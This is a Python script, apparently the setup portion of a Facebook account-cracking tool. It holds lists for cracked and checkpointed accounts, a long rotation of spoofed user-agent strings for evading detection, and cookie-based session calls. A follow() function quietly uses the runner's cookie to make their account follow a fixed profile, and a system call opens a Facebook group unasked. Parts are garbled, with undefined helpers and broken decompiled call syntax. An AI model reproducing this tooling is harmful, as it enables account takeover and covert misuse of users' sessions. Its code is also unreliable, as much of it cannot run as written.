
import os
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from os import system as _SHARIYER404_
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    _SHAKIB_('pip install mechanize requests futures bs4==2 > /dev/null')
    _SHAKIB_('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
def lo(word):
    SHAKIB = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(SHARIYER404)):
            sys.stdout.write(('\r{}{}').format(str(word), SHAKIB[x]))
            time.sleep(0.1)
            sys.stdout.flush()
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://d.facebook.com/itz.ongkon.mallik', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://d.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class SHARIYER404:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.006)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
color=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;97m'])
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
_SHAKIB_('xdg-open https://facebook.com/groups/814354150210238/')
import os
def lo(word):
    emran = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(emran)):
            sys.stdout.write(('\r{}{}').format(str(word), emran[x]))
            time.sleep(0.1)
            sys.stdout.flush()
def logo():
	color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
logo = ("""\033[1;97m   


   _____ _    _          _____  _______     ________ _____  _  _    ___  _  _   
  / ____| |  | |   /\   |  __ \|_   _\ \   / /  ____|  __ \| || |  / _ \| || |  
 | (___ | |__| |  /  \  | |__) | | |  \ \_/ /| |__  | |__) | || |_| | | | || |_ 
  \___ \|  __  | / /\ \ |  _  /  | |   \   / |  __| |  _  /|__   _| | | |__   _|
  ____) | |  | |/ ____ \| | \ \ _| |_   | |  | |____| | \ \   | | | |_| |  | |  
 |_____/|_|  |_/_/    \_\_|  \_\_____|  |_|  |______|_|  \_\  |_|  \___/   |_|  
                                                                                
                                                                                


         


╔══════════════════════════════╗
║ 𝙏𝙊𝙊𝙇 𝙊𝙒𝙉𝙀𝙍 : 𝙎𝙃𝘼𝙆𝙄𝘽          ║
║ 𝙏𝙊𝙊𝙇 𝙎𝙏𝘼𝙐𝙏𝙀 : 𝙁𝙍𝙀𝙀           ║
║ 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 : 𝙈𝘿 𝙎𝙃𝘼𝙆𝙄𝘽         ║
║ 𝙂𝙄𝙏𝙃𝙐𝘽 : 𝙎𝙃𝘼𝙆𝙄𝘽-𝟳𝟭           ║
║ 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙂𝙍𝙐𝙋𝙀 : 𝘿𝘼𝙍𝙆 𝙎𝙊𝙐𝙇   ║
╚══════════════════════════════╝


 """)
def linex():
	print('\033[1;97m══════════════════════════════════════')
loop = 0
oks = []
cps = []

def clear():
    _SHARIYER404_('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Multilaser_G_2 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/363.0.0.6.63;]"}    
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Multilaser_F_Pro_2 Build/V5_20210610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/224.0.0.9.117;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; 23028RNCAG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/362.0.0.10.67;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Z5158 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/360.0.0.7.53;]"}  
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Twist 4 Mini Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/363.0.0.6.63;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"} 
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}   
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"} 
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"} 
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}  
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"} 
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.0; Moto C Build/NRD90M.041)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230305.008.C1)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; Viva_1003G Build/PPR1.180610.011)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2322G Build/SKQ1.220213.001)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-10)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R112-15359.58.0)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; SM-A3460 Build/TP1A.220624.014)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.45.0)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)"}
header_grup = {"user-agent": "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)"}
header_grup = {"user-agent": "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)"}
header_grup = {"user-agent": "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)"}
header_grup = {"user-agent": "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)"}
header_grup = {"user-agent": "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)"}
header_grup = {"user-agent": "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)"}
header_grup = {"user-agent": "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)"}
header_grup = {"user-agent": "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)"}
header_grup = {"user-agent": "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)"}
header_grup = {"user-agent": "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)"}
header_grup = {"user-agent": "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)"}
header_grup = {"user-agent": "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1)"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2"}
header_grup = {"user-agent": "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)"}
header_grup = {"user-agent": "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)"}
header_grup = {"user-agent": "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)"}
header_grup = {"user-agent": "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)"}
header_grup = {"user-agent": "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)"}
header_grup = {"user-agent": "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)"}
header_grup = {"user-agent": "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)"}
header_grup = {"user-agent": "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)"}
header_grup = {"user-agent": "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)"}
header_grup = {"user-agent": "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)"}
header_grup = {"user-agent": "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)"}
header_grup = {"user-agent": "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)"}
header_grup = {"user-agent": "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)"}
header_grup = {"user-agent": "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-HUAWE"}
header_grup = {"user-agent": "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1)"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2"}
header_grup = {"user-agent": "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)"}
header_grup = {"user-agent": "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-N909O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4414.144 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 630"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0"}
